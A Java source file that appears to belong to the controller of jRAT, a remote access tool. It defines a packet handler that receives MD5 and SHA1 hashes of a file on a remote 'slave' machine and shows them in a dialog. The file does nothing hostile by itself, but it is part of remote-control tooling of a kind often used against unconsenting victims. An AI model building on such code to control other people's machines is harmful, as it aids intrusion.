package jrat.module.fs.packets;

import jrat.controller.Slave;
import jrat.controller.packets.incoming.AbstractIncomingPacket;
import jrat.module.fs.ui.FrameRemoteFiles;

import javax.swing.*;
import java.io.DataInputStream;


public class Packet46FileHash extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		final String md5 = slave.readLine();
		final String sha1 = slave.readLine();

		FrameRemoteFiles frame = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);
		if (frame != null) {
			if (frame.getFilesPanel().getRemoteTable().waitingForHash) {
				new Thread() {
					@Override
					public void run() {
						JOptionPane.showMessageDialog(null, "File MD5:\n\n" + md5 + "\n\n\nFile SHA1:\n\n" + sha1, "Hash", JOptionPane.INFORMATION_MESSAGE);
					}
				}.start();
				frame.getFilesPanel().getRemoteTable().waitingForHash = false;
			}
		}
	}

}
